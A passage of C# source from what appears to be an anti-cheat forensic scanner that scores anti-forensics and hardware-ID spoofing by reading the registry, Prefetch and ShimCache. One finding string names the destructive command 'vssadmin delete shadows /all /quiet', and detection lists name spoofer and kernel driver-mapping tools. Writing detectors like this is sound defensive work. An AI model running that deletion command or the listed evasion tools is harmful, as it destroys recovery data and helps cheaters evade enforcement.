                    });

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = "Prefetch Folder Tampered",
                        severity = "Medium",
                        path = @"C:\Windows\Prefetch",
                        action = "Evidence deletion detected",
                        source_type = "Bypass Detection"
                    });
                }

                // 6. Check for suspicious registry modifications
                var registryTampering = await CheckRegistryTampering();
                if (registryTampering.Count > 0)
                {
                    bypassScore += 20;
                    detectedMethods.Add("Registry Tampering");
                    foreach (var tampering in registryTampering)
                    {
                        bypassMethods.Add(new
                        {
                            method = "Registry Tampering",
                            description = tampering.Description,
                            severity = "High",
                            details = tampering.Details,
                            impact = tampering.Impact
                        });
                    }

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = $"Registry Tampering ({registryTampering.Count} modifications)",
                        severity = "High",
                        path = "Registry",
                        action = "Anti-forensics registry modifications",
                        source_type = "Bypass Detection"
                    });
                }

                // 7. Check for Volume Shadow Copy deletion
                var shadowCopiesDeleted = await CheckShadowCopies();
                if (shadowCopiesDeleted)
                {
                    bypassScore += 35;
                    detectedMethods.Add("Shadow Copies Deleted");
                    bypassMethods.Add(new
                    {
                        method = "Volume Shadow Copies Deleted",
                        description = "All Volume Shadow Copies have been deleted - prevents recovery of deleted files",
                        severity = "Critical",
                        details = "Command likely used: vssadmin delete shadows /all /quiet\nThis is a common ransomware/anti-forensics technique",
                        impact = "Cannot recover deleted cheat files from shadow copies"
                    });

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = "Shadow Copies Deleted",
                        severity = "Critical",
                        path = "System",
                        action = "Advanced anti-forensics technique",
                        source_type = "Bypass Detection"
                    });
                }

                // 8. Check for HWID Spoofing
                var hwidSpoofing = await DetectHWIDSpoofing();
                if (hwidSpoofing.Count > 0)
                {
                    bypassScore += 40;
                    detectedMethods.Add("HWID Spoofing");
                    foreach (var spoof in hwidSpoofing)
                    {
                        bypassMethods.Add(new
                        {
                            method = "HWID Spoofing Detected",
                            description = spoof.Description,
                            severity = "Critical",
                            details = spoof.Details,
                            impact = "User is attempting to bypass hardware bans by spoofing MAC address, CPU ID, disk serial, or other hardware identifiers"
                        });
                    }

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = $"HWID Spoofing ({hwidSpoofing.Count} indicators)",
                        severity = "Critical",
                        path = "Hardware",
                        action = "Hardware ID spoofing detected",
                        source_type = "Bypass Detection"
                    });
                }

                // Add summary
                if (bypassMethods.Count > 0)
                {
                    _artifacts["BYPASS_METHODS"] = bypassMethods;

                    // Add overall assessment
                    var assessment = new
                    {
                        method = "Overall Bypass Assessment",
                        description = $"Detected {detectedMethods.Count} bypass method(s) with total score: {bypassScore}/200",
                        severity = bypassScore >= 100 ? "Critical" : bypassScore >= 50 ? "High" : "Medium",
                        details = $"Methods detected: {string.Join(", ", detectedMethods)}\n\nRisk Level: {GetBypassRiskLevel(bypassScore)}\n\nThis indicates the user is actively trying to hide evidence of cheat usage.",
                        impact = "Forensic evidence has been compromised. User is aware of detection methods and attempting to evade them."
                    };

                    bypassMethods.Insert(0, assessment);
                    _artifacts["BYPASS_METHODS"] = bypassMethods;
                }

                Console.WriteLine($"? Bypass detection: {detectedMethods.Count} method(s) detected (Score: {bypassScore}/200)");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error detecting bypass methods: {ex.Message}");
            }
        }

        private string GetBypassRiskLevel(int score)
        {
            if (score >= 150) return "EXTREME - Multiple advanced anti-forensics techniques";
            if (score >= 100) return "VERY HIGH - Sophisticated evidence tampering";
            if (score >= 50) return "HIGH - Active evidence hiding";
            if (score >= 25) return "MODERATE - Some suspicious activity";
            return "LOW - Minimal bypass attempts";
        }

        private async Task<bool> CheckPrefetchDisabled()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"))
                {
                    if (key == null) return false;
                    var value = key.GetValue("EnablePrefetcher");
                    return value != null && (int)value == 0;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> CheckEventLogService()
        {
            try
            {
                var service = System.ServiceProcess.ServiceController.GetServices()
                    .FirstOrDefault(s => s.ServiceName.Equals("EventLog", StringComparison.OrdinalIgnoreCase));
                
                return service != null && service.Status != System.ServiceProcess.ServiceControllerStatus.Running;
            }
            catch
            {
                return false;
            }
        }

        private async Task<List<ClearedLogInfo>> CheckClearedEventLogs()
        {
            var clearedLogs = new List<ClearedLogInfo>();
            
            try
            {
                var logNames = new[] { "System", "Security", "Application" };
                var recentThreshold = DateTime.Now.AddDays(-7); // Last 7 days

                foreach (var logName in logNames)
                {
                    try
                    {
                        var log = new System.Diagnostics.Eventing.Reader.EventLogReader(logName);
                        var query = new System.Diagnostics.Eventing.Reader.EventLogQuery(logName, System.Diagnostics.Eventing.Reader.PathType.LogName);
                        var reader = new System.Diagnostics.Eventing.Reader.EventLogReader(query);
                        
                        // Check for Event ID 1102 (Security log cleared) or 104 (System log cleared)
                        var clearEventIds = new[] { 1102, 104 };
                        
                        System.Diagnostics.Eventing.Reader.EventRecord eventRecord;
                        while ((eventRecord = reader.ReadEvent()) != null)
                        {
                            if (clearEventIds.Contains(eventRecord.Id) && eventRecord.TimeCreated.HasValue)
                            {
                                if (eventRecord.TimeCreated.Value > recentThreshold)
                                {
                                    clearedLogs.Add(new ClearedLogInfo
                                    {
                                        LogName = logName,
                                        ClearedTime = eventRecord.TimeCreated.Value,
                                        ClearedBy = eventRecord.UserId?.Value ?? "Unknown"
                                    });
                                    break; // Only need to know it was cleared
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }

            return clearedLogs;
        }

        private async Task<List<CleanerToolInfo>> DetectCleanerTools()
        {
            var tools = new List<CleanerToolInfo>();
            
            try
            {
                var cleanerSignatures = new Dictionary<string, string[]>
                {
                    { "CCleaner", new[] { "ccleaner", "ccleaner64" } },
                    { "BleachBit", new[] { "bleachbit" } },
                    { "Privazer", new[] { "privazer" } },
                    { "Wise Care 365", new[] { "wisecare365", "wisecleaner" } },
                    { "Advanced SystemCare", new[] { "asccleaner", "iobituninstaller" } },
                    { "Glary Utilities", new[] { "glaryutilities", "integrator" } }
                };

                // Check Prefetch for cleaner tools
                var prefetchPath = @"C:\Windows\Prefetch";
                if (Directory.Exists(prefetchPath))
                {
                    var prefetchFiles = Directory.GetFiles(prefetchPath, "*.pf");
                    
                    foreach (var pfFile in prefetchFiles)
                    {
                        var fileName = Path.GetFileNameWithoutExtension(pfFile).ToLower();
                        
                        foreach (var cleaner in cleanerSignatures)
                        {
                            if (cleaner.Value.Any(sig => fileName.Contains(sig)))
                            {
                                var fileInfo = new FileInfo(pfFile);
                                tools.Add(new CleanerToolInfo
                                {
                                    Name = cleaner.Key,
                                    Path = pfFile,
                                    LastRun = fileInfo.LastWriteTime
                                });
                                break;
                            }
                        }
                    }
                }

                // Check installed programs
                var uninstallKeys = new[]
                {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                };

                foreach (var uninstallKey in uninstallKeys)
                {
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(uninstallKey))
                        {
                            if (key == null) continue;

                            foreach (var subKeyName in key.GetSubKeyNames())
                            {
                                using (var subKey = key.OpenSubKey(subKeyName))
                                {
                                    var displayName = subKey?.GetValue("DisplayName")?.ToString()?.ToLower();
                                    if (string.IsNullOrEmpty(displayName)) continue;

                                    foreach (var cleaner in cleanerSignatures)
                                    {
                                        if (displayName.Contains(cleaner.Key.ToLower()))
                                        {
                                            var installLocation = subKey.GetValue("InstallLocation")?.ToString();
                                            if (!tools.Any(t => t.Name == cleaner.Key))
                                            {
                                                tools.Add(new CleanerToolInfo
                                                {
                                                    Name = cleaner.Key,
                                                    Path = installLocation ?? "Installed",
                                                    LastRun = DateTime.Now // Can't determine from registry
                                                });
                                            }
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }

            return tools.DistinctBy(t => t.Name).ToList();
        }

        private async Task<PrefetchFolderStatus> CheckPrefetchFolder()
        {
            try
            {
                var prefetchPath = @"C:\Windows\Prefetch";
                if (!Directory.Exists(prefetchPath))
                {
                    return new PrefetchFolderStatus { IsEmpty = true, FileCount = 0, TooFew = true };
                }

                var fileCount = Directory.GetFiles(prefetchPath, "*.pf").Length;
                
                return new PrefetchFolderStatus
                {
                    IsEmpty = fileCount == 0,
                    FileCount = fileCount,
                    TooFew = fileCount < 20 && fileCount > 0 // Normal systems have 100-200 files
                };
            }
            catch
            {
                return new PrefetchFolderStatus { IsEmpty = false, FileCount = -1, TooFew = false };
            }
        }

        private async Task<List<RegistryTamperingInfo>> CheckRegistryTampering()
        {
            var tampering = new List<RegistryTamperingInfo>();

            try
            {
                // Check if UserAssist is disabled
                var userAssistPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(userAssistPath))
                {
                    if (key != null)
                    {
                        var startTrackProgs = key.GetValue("Start_TrackProgs");
                        if (startTrackProgs != null && (int)startTrackProgs == 0)
                        {
                            tampering.Add(new RegistryTamperingInfo
                            {
                                Description = "UserAssist tracking disabled",
                                Details = $"Registry: {userAssistPath}\\Start_TrackProgs = 0\nThis prevents Windows from tracking program usage",
                                Impact = "Program execution frequency cannot be tracked"
                            });
                        }
                    }
                }

                // Check if Recent Documents tracking is disabled
                var policiesPath = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(policiesPath))
                {
                    if (key != null)
                    {
                        var noRecentDocs = key.GetValue("NoRecentDocsHistory");
                        if (noRecentDocs != null && (int)noRecentDocs == 1)
                        {
                            tampering.Add(new RegistryTamperingInfo
                            {
                                Description = "Recent Documents tracking disabled",
                                Details = $"Registry: {policiesPath}\\NoRecentDocsHistory = 1\nThis prevents tracking of recently opened files",
                                Impact = "Cannot track which files were recently accessed"
                            });
                        }
                    }
                }
            }
            catch { }

            return tampering;
        }

        private async Task<bool> CheckShadowCopies()
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "vssadmin",
                    Arguments = "list shadows",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(psi))
                {
                    if (process == null) return false;
                    
                    var output = await process.StandardOutput.ReadToEndAsync();
                    await process.WaitForExitAsync();

                    // If output contains "No items found" or is very short, shadow copies are deleted
                    return output.Contains("No items found") || output.Length < 100;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<List<dynamic>> DetectHWIDSpoofing()
        {
            var spoofingIndicators = new List<dynamic>();

            try
            {
                // 1. Check for known HWID spoofer processes
                var spooferProcesses = new[] { "spoofer", "hwid", "macchanger", "tmac", "technitium", "amac", "changeme", "idspoof" };
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        var processName = proc.ProcessName.ToLower();
                        if (spooferProcesses.Any(s => processName.Contains(s)))
                        {
                            spoofingIndicators.Add(new
                            {
                                Description = $"HWID Spoofer Process Running: {proc.ProcessName}",
                                Details = $"Process: {proc.ProcessName} (PID: {proc.Id})\nPath: {proc.MainModule?.FileName ?? "N/A"}\nThis is a known HWID spoofing tool"
                            });
                        }
                    }
                    catch { }
                }

                // 2. Check for spoofer files in common locations
                var spooferPaths = new[]
                {
                    @"C:\Program Files\HWID Spoofer",
                    @"C:\Program Files (x86)\HWID Spoofer",
                    @"C:\Spoofer",
                    @"C:\HWID",
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\Spoofer",
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Spoofer"
                };

                foreach (var path in spooferPaths)
                {
                    if (Directory.Exists(path))
                    {
                        spoofingIndicators.Add(new
                        {
                            Description = "HWID Spoofer Directory Found",
                            Details = $"Path: {path}\nFound directory commonly used by HWID spoofers"
                        });
                    }
                }

                // 3. Check for MAC address spoofing via registry
                var macSpoofing = await CheckMACAddressSpoofing();
                if (macSpoofing.Count > 0)
                {
                    foreach (var mac in macSpoofing)
                    {
                        spoofingIndicators.Add(new
                        {
                            Description = "MAC Address Spoofing Detected",
                            Details = mac
                        });
                    }
                }

                // 4. Check for suspicious disk serial numbers (all zeros, sequential, etc.)
                var diskSpoofing = await CheckDiskSerialSpoofing();
                if (diskSpoofing.Count > 0)
                {
                    foreach (var disk in diskSpoofing)
                    {
                        spoofingIndicators.Add(new
                        {
                            Description = "Suspicious Disk Serial Number",
                            Details = disk
                        });
                    }
                }

                // 5. Check for known spoofer drivers
                var spooferDrivers = new[] { "hwid", "spoofer", "kdmapper", "drvmap", "eac_mapper" };
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_SystemDriver"))
                {
                    foreach (ManagementObject driver in searcher.Get())
                    {
                        try
                        {
                            var driverName = driver["Name"]?.ToString()?.ToLower() ?? "";
                            var driverPath = driver["PathName"]?.ToString()?.ToLower() ?? "";
                            
                            if (spooferDrivers.Any(s => driverName.Contains(s) || driverPath.Contains(s)))
                            {
                                spoofingIndicators.Add(new
                                {
                                    Description = "HWID Spoofer Driver Detected",
                                    Details = $"Driver: {driver["Name"]}\nPath: {driver["PathName"]}\nState: {driver["State"]}\nThis driver is commonly used for HWID spoofing"
                                });
                            }
                        }
                        catch { }
                    }
                }

                // 6. Check for registry modifications related to HWID
                var hwidRegKeys = new[]
                {
                    @"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001",
                    @"SOFTWARE\Microsoft\Cryptography",
                    @"SYSTEM\CurrentControlSet\Control\SystemInformation"
                };

                foreach (var keyPath in hwidRegKeys)
                {
                    try
                    {
                        using (var key = Registry.LocalMachine.OpenSubKey(keyPath))
                        {
                            if (key != null)
                            {
                                var machineGuid = key.GetValue("MachineGuid")?.ToString();
                                var hwProfileGuid = key.GetValue("HwProfileGuid")?.ToString();
                                
                                // Check for suspicious patterns (all zeros, sequential, etc.)
                                if (!string.IsNullOrEmpty(machineGuid) && IsSuspiciousGUID(machineGuid))
                                {
                                    spoofingIndicators.Add(new
                                    {
                                        Description = "Suspicious Machine GUID Pattern",
                                        Details = $"Registry: {keyPath}\nMachineGuid: {machineGuid}\nThis GUID appears to be spoofed (contains suspicious patterns)"
                                    });
                                }
                            }
                        }
                    }
                    catch { }
                }

                // 7. Check for Prefetch/Registry entries of known spoofers
                var knownSpoofers = new[]
                {
                    "hwid spoofer", "amidedos", "changeme", "macchanger", "tmac",
                    "technitium", "smac", "kdmapper", "drvmap", "eac_mapper",
                    "be_mapper", "battleye_mapper", "faceit_mapper", "vanguard_mapper"
                };

                var prefetchPath = @"C:\Windows\Prefetch";
                if (Directory.Exists(prefetchPath))
                {
                    foreach (var file in Directory.GetFiles(prefetchPath, "*.pf"))
                    {
                        var fileName = Path.GetFileName(file).ToLower();
                        if (knownSpoofers.Any(s => fileName.Contains(s.Replace(" ", ""))))
                        {
                            spoofingIndicators.Add(new
                            {
                                Description = "HWID Spoofer Execution History",
                                Details = $"Prefetch File: {Path.GetFileName(file)}\nPath: {file}\nLast Modified: {File.GetLastWriteTime(file):yyyy-MM-dd HH:mm:ss}\nUser has executed HWID spoofing software"
                            });
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error detecting HWID spoofing: {ex.Message}");
            }

            return spoofingIndicators;
        }

        private async Task<List<string>> CheckMACAddressSpoofing()
        {
            var spoofedMACs = new List<string>();

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL"))
                {
                    foreach (ManagementObject adapter in searcher.Get())
                    {
                        try
                        {
                            var macAddress = adapter["MACAddress"]?.ToString() ?? "";
                            var adapterName = adapter["Name"]?.ToString() ?? "";
                            var pnpDeviceId = adapter["PNPDeviceID"]?.ToString() ?? "";

                            // Check registry for NetworkAddress override (manual MAC spoofing)
                            if (!string.IsNullOrEmpty(pnpDeviceId))
                            {
                                var regPath = $@"SYSTEM\CurrentControlSet\Control\Class\{{4D36E972-E325-11CE-BFC1-08002BE10318}}";
                                using (var classKey = Registry.LocalMachine.OpenSubKey(regPath))
                                {
                                    if (classKey != null)
                                    {
                                        foreach (var subKeyName in classKey.GetSubKeyNames())
                                        {
                                            using (var subKey = classKey.OpenSubKey(subKeyName))
                                            {
                                                if (subKey != null)
                                                {
                                                    var deviceId = subKey.GetValue("MatchingDeviceId")?.ToString() ?? "";
                                                    var networkAddress = subKey.GetValue("NetworkAddress")?.ToString();

                                                    if (!string.IsNullOrEmpty(networkAddress))
                                                    {
                                                        spoofedMACs.Add($"Adapter: {adapterName}\nOriginal MAC: {macAddress}\nSpoofed MAC: {networkAddress}\nRegistry: {regPath}\\{subKeyName}\\NetworkAddress\nMAC address has been manually overridden in registry");
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                            // Check for suspicious MAC patterns
                            if (!string.IsNullOrEmpty(macAddress))
                            {
                                var cleanMac = macAddress.Replace(":", "").Replace("-", "");
                                
                                // Check for all zeros, sequential, or other suspicious patterns
                                if (cleanMac == "000000000000" || cleanMac == "FFFFFFFFFFFF" ||
                                    cleanMac == "123456789ABC" || cleanMac == "AABBCCDDEEFF")
                                {
                                    spoofedMACs.Add($"Adapter: {adapterName}\nMAC: {macAddress}\nSuspicious Pattern: This MAC address appears to be spoofed (contains obvious pattern)");
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return spoofedMACs;
        }

        private async Task<List<string>> CheckDiskSerialSpoofing()
        {
            var suspiciousDisks = new List<string>();

            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject disk in searcher.Get())
                    {
                        try
                        {
                            var serialNumber = disk["SerialNumber"]?.ToString()?.Trim() ?? "";
                            var model = disk["Model"]?.ToString() ?? "";

                            if (!string.IsNullOrEmpty(serialNumber))
                            {
                                // Check for suspicious patterns
                                if (serialNumber == "0000000000" || serialNumber == "1111111111" ||
                                    serialNumber == "AAAAAAAAAA" || serialNumber.All(c => c == '0') ||
                                    serialNumber.Length < 5)
                                {
                                    suspiciousDisks.Add($"Disk: {model}\nSerial: {serialNumber}\nSuspicious Pattern: This serial number appears to be spoofed");
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            return suspiciousDisks;
        }

        private bool IsSuspiciousGUID(string guid)
        {
            if (string.IsNullOrEmpty(guid)) return false;

            var cleanGuid = guid.Replace("-", "").Replace("{", "").Replace("}", "").ToUpper();

            // Check for all zeros, all ones, sequential patterns
            if (cleanGuid.All(c => c == '0') || cleanGuid.All(c => c == 'F') ||
                cleanGuid == "00000000000000000000000000000000" ||
                cleanGuid == "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" ||
                cleanGuid == "12345678901234567890123456789012")
            {
                return true;
            }

            return false;
        }

        // Helper classes
        private class ClearedLogInfo
        {
            public string LogName { get; set; } = "";
            public DateTime ClearedTime { get; set; }
            public string ClearedBy { get; set; } = "";
        }

        private class CleanerToolInfo
        {
            public string Name { get; set; } = "";
            public string Path { get; set; } = "";
            public DateTime LastRun { get; set; }
        }

        private class PrefetchFolderStatus
        {
            public bool IsEmpty { get; set; }
            public int FileCount { get; set; }
            public bool TooFew { get; set; }
        }

        private class RegistryTamperingInfo
        {
            public string Description { get; set; } = "";
            public string Details { get; set; } = "";
            public string Impact { get; set; } = "";
        }

        private async Task ScanPrefetchFiles()
        {
            var prefetchFindings = new List<object>();
            var prefetchPath = @"C:\Windows\Prefetch";

            try
            {
                if (!Directory.Exists(prefetchPath))
                {
                    Console.WriteLine("??  Prefetch folder not accessible");
                    return;
                }

                var prefetchFiles = Directory.GetFiles(prefetchPath, "*.pf");
                var suspiciousCount = 0;

                foreach (var pfFile in prefetchFiles)
                {
                    try
                    {
                        var fileName = Path.GetFileNameWithoutExtension(pfFile).ToLower();
                        
                        // Remove hash suffix (last 8 chars after dash)
                        var dashIndex = fileName.LastIndexOf('-');
                        if (dashIndex > 0)
                        {
                            fileName = fileName.Substring(0, dashIndex);
                        }

                        // Filter 1: Skip legitimate system/game files
                        var legitimateProcesses = new[]
                        {
                            "svchost", "explorer", "chrome", "firefox", "discord", "steam",
                            "fivem", "gta5", "gtav", "rockstarlauncher", "epicgameslauncher",
                            "nvidia", "amd", "intel", "windows", "microsoft", "system32",
                            "dwm", "csrss", "lsass", "services", "smss", "winlogon"
                        };

                        if (legitimateProcesses.Any(lp => fileName.Contains(lp)))
                            continue;

                        // Filter 2: Check against cheat keywords
                        var matched = false;
                        string matchedKeyword = "";
                        
                        foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(30))
                        {
                            if (fileName.Contains(keyword.ToLower()))
                            {
                                matched = true;
                                matchedKeyword = keyword;
                                break;
                            }
                        }

                        // Filter 3: Check against known cheat names
                        if (!matched)
                        {
                            foreach (var cheat in CheatDatabase.CheatSignatures.Take(50))
                            {
                                if (fileName.Contains(cheat.Name.ToLower().Replace(" ", "")))
                                {
                                    matched = true;
                                    matchedKeyword = cheat.Name;
                                    break;
                                }
                            }
                        }

                        if (matched)
                        {
                            var fileInfo = new FileInfo(pfFile);
                            var lastModified = fileInfo.LastWriteTime;
                            var executionCount = "Unknown"; // Would need binary parsing for exact count

                            prefetchFindings.Add(new
                            {
                                description = $"Prefetch evidence: `{fileName}` (Keyword: {matchedKeyword})",
                                details = $"File: {pfFile}\nLast Execution: {lastModified:yyyy-MM-dd HH:mm:ss}\nThis indicates the executable ran on this PC.",
                                status = "threat"
                            });

                            _findings.Add(new
                            {
                                category = "Prefetch Evidence",
                                name = $"Execution History: {fileName}",
                                severity = "High",
                                path = pfFile,
                                action = "Detected in Prefetch",
                                source_type = "Prefetch"
                            });

                            suspiciousCount++;
                        }
                    }
                    catch { }
                }

                if (prefetchFindings.Count > 0)
                {
                    _artifacts["PREFETCH_EVIDENCE"] = prefetchFindings;
                }

                Console.WriteLine($"? Scanned {prefetchFiles.Length} prefetch files, found {suspiciousCount} suspicious");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning prefetch: {ex.Message}");
            }
        }

        private async Task ScanRegistryForensics()
        {
            var registryFindings = new List<object>();

            try
            {
                // 1. MUICache - All executables that have ever run
                await ScanMUICache(registryFindings);

                // 2. UserAssist - Encrypted execution history
                await ScanUserAssist(registryFindings);

                // 3. RecentApps - Recent applications
                await ScanRecentApps(registryFindings);

                if (registryFindings.Count > 0)
                {
                    _artifacts["REGISTRY_FORENSICS"] = registryFindings;
                }

                Console.WriteLine($"? Registry forensics found {registryFindings.Count} suspicious entries");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error in registry forensics: {ex.Message}");
            }
        }

        private async Task ScanMUICache(List<object> findings)
        {
            try
            {
                var muiCachePaths = new[]
                {
                    @"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
                    @"Software\Microsoft\Windows\ShellNoRoam\MUICache",
                    @"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
                };

                foreach (var path in muiCachePaths)
                {
                    try
                    {
                        using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(path))
                        {
                            if (key == null) continue;

                            foreach (var valueName in key.GetValueNames())
                            {
                                try
                                {
                                    var exePath = valueName.ToLower();

                                    // Filter 1: Skip system paths
                                    var systemPaths = new[] { "windows", "program files", "microsoft", "system32" };
                                    if (systemPaths.Any(sp => exePath.Contains(sp)))
                                        continue;

                                    // Filter 2: Check for suspicious keywords
                                    foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(30))
                                    {
                                        if (exePath.Contains(keyword.ToLower()))
                                        {
                                            findings.Add(new
                                            {
                                                description = $"MUICache entry: `{Path.GetFileName(exePath)}` (Keyword: {keyword})",
                                                details = $"Full Path: {valueName}\nRegistry: {path}",
                                                status = "warning"
                                            });

                                            _findings.Add(new
                                            {
                                                category = "Registry Forensics",
                                                name = $"MUICache: {Path.GetFileName(exePath)}",
                                                severity = "Medium",
                                                path = valueName,
                                                action = "Found in execution history",
                                                source_type = "Registry"
                                            });
                                            break;
                                        }
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private async Task ScanUserAssist(List<object> findings)
        {
            try
            {
                var userAssistPath = @"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist";
                
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(userAssistPath))
                {
                    if (key == null) return;

                    foreach (var guidKey in key.GetSubKeyNames())
                    {
                        try
                        {
                            using (var countKey = key.OpenSubKey($"{guidKey}\\Count"))
                            {
                                if (countKey == null) continue;

                                foreach (var valueName in countKey.GetValueNames())
                                {
                                    try
                                    {
                                        // UserAssist is ROT13 encoded
                                        var decoded = Rot13Decode(valueName).ToLower();

                                        // Filter: Skip system paths
                                        if (decoded.Contains("windows") || decoded.Contains("system32"))
                                            continue;

                                        // Check for suspicious keywords
                                        foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(20))
                                        {
                                            if (decoded.Contains(keyword.ToLower()))
                                            {
                                                findings.Add(new
                                                {
                                                    description = $"UserAssist entry: `{Path.GetFileName(decoded)}` (Keyword: {keyword})",
                                                    details = $"Decoded Path: {decoded}\nThis tracks program execution frequency.",
                                                    status = "warning"
                                                });

                                                _findings.Add(new
                                                {
                                                    category = "Registry Forensics",
                                                    name = $"UserAssist: {Path.GetFileName(decoded)}",
                                                    severity = "Medium",
                                                    path = decoded,
                                                    action = "Found in UserAssist",
                                                    source_type = "Registry"
                                                });
                                                break;
                                            }
                                        }
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        private async Task ScanRecentApps(List<object> findings)
        {
            try
            {
                var recentAppsPath = @"Software\Microsoft\Windows\CurrentVersion\Search\RecentApps";
                
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(recentAppsPath))
                {
                    if (key == null) return;

                    foreach (var appGuid in key.GetSubKeyNames())
                    {
                        try
                        {
                            using (var appKey = key.OpenSubKey(appGuid))
                            {
                                if (appKey == null) continue;

                                var appPath = appKey.GetValue("AppPath")?.ToString()?.ToLower();
                                if (string.IsNullOrEmpty(appPath)) continue;

                                // Filter: Skip system paths
                                if (appPath.Contains("windows") || appPath.Contains("system32"))
                                    continue;

                                // Check for suspicious keywords
                                foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(20))
                                {
                                    if (appPath.Contains(keyword.ToLower()))
                                    {
                                        var lastAccessTime = appKey.GetValue("LastAccessedTime")?.ToString() ?? "Unknown";

                                        findings.Add(new
                                        {
                                            description = $"Recent app: `{Path.GetFileName(appPath)}` (Keyword: {keyword})",
                                            details = $"Path: {appPath}\nLast Accessed: {lastAccessTime}",
                                            status = "warning"
                                        });

                                        _findings.Add(new
                                        {
                                            category = "Registry Forensics",
                                            name = $"Recent App: {Path.GetFileName(appPath)}",
                                            severity = "Medium",
                                            path = appPath,
                                            action = "Found in recent apps",
                                            source_type = "Registry"
                                        });
                                        break;
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        private async Task ScanShimCache()
        {
            var shimCacheFindings = new List<object>();

            try
            {
                // ShimCache is in SYSTEM registry (requires admin)
                var shimCachePath = @"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache";
                
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(shimCachePath))
                {
                    if (key == null)
                    {
                        Console.WriteLine("??  ShimCache not accessible (requires admin)");
                        return;
                    }

                    var appCompatCache = key.GetValue("AppCompatCache") as byte[];
                    if (appCompatCache == null || appCompatCache.Length == 0)
                        return;

                    // Parse ShimCache binary data (simplified - full parsing is complex)
                    var entries = ParseShimCacheData(appCompatCache);

                    foreach (var entry in entries)
                    {
                        try
                        {
                            var exePath = entry.Path.ToLower();
                            var fileName = Path.GetFileName(exePath);

                            // Filter 1: Skip system paths
                            var systemPaths = new[] { "windows", "system32", "program files\\windows" };
                            if (systemPaths.Any(sp => exePath.Contains(sp)))
                                continue;

                            // Filter 2: Skip legitimate processes
                            var legitimateProcesses = new[]
                            {
                                "chrome", "firefox", "discord", "steam", "fivem", "gta5",
                                "explorer", "svchost", "nvidia", "amd", "intel"
                            };
                            if (legitimateProcesses.Any(lp => fileName.Contains(lp)))
                                continue;

                            // Filter 3: Check for suspicious keywords
                            var matched = false;
                            string matchedKeyword = "";

                            foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(30))
                            {
                                if (fileName.Contains(keyword.ToLower()))
                                {
                                    matched = true;
                                    matchedKeyword = keyword;
                                    break;
                                }
                            }

                            // Filter 4: Check against known cheats
                            if (!matched)
                            {
                                foreach (var cheat in CheatDatabase.CheatSignatures.Take(50))
                                {
                                    if (fileName.Contains(cheat.Name.ToLower().Replace(" ", "")))
                                    {
                                        matched = true;
                                        matchedKeyword = cheat.Name;
                                        break;
                                    }
                                }
                            }

                            if (matched)
                            {
                                shimCacheFindings.Add(new
                                {
                                    description = $"ShimCache entry: `{fileName}` (Keyword: {matchedKeyword})",
                                    details = $"Full Path: {entry.Path}\nLast Modified: {entry.LastModified:yyyy-MM-dd HH:mm:ss}\nFile Size: {entry.FileSize} bytes\n\nNote: This file was executed on this PC, even if deleted now.",
                                    status = "threat"
                                });

                                _findings.Add(new
                                {
                                    category = "ShimCache Evidence",
                                    name = $"Execution History: {fileName}",
                                    severity = "High",
                                    path = entry.Path,
                                    action = "Found in ShimCache",
                                    source_type = "ShimCache"
                                });
                            }
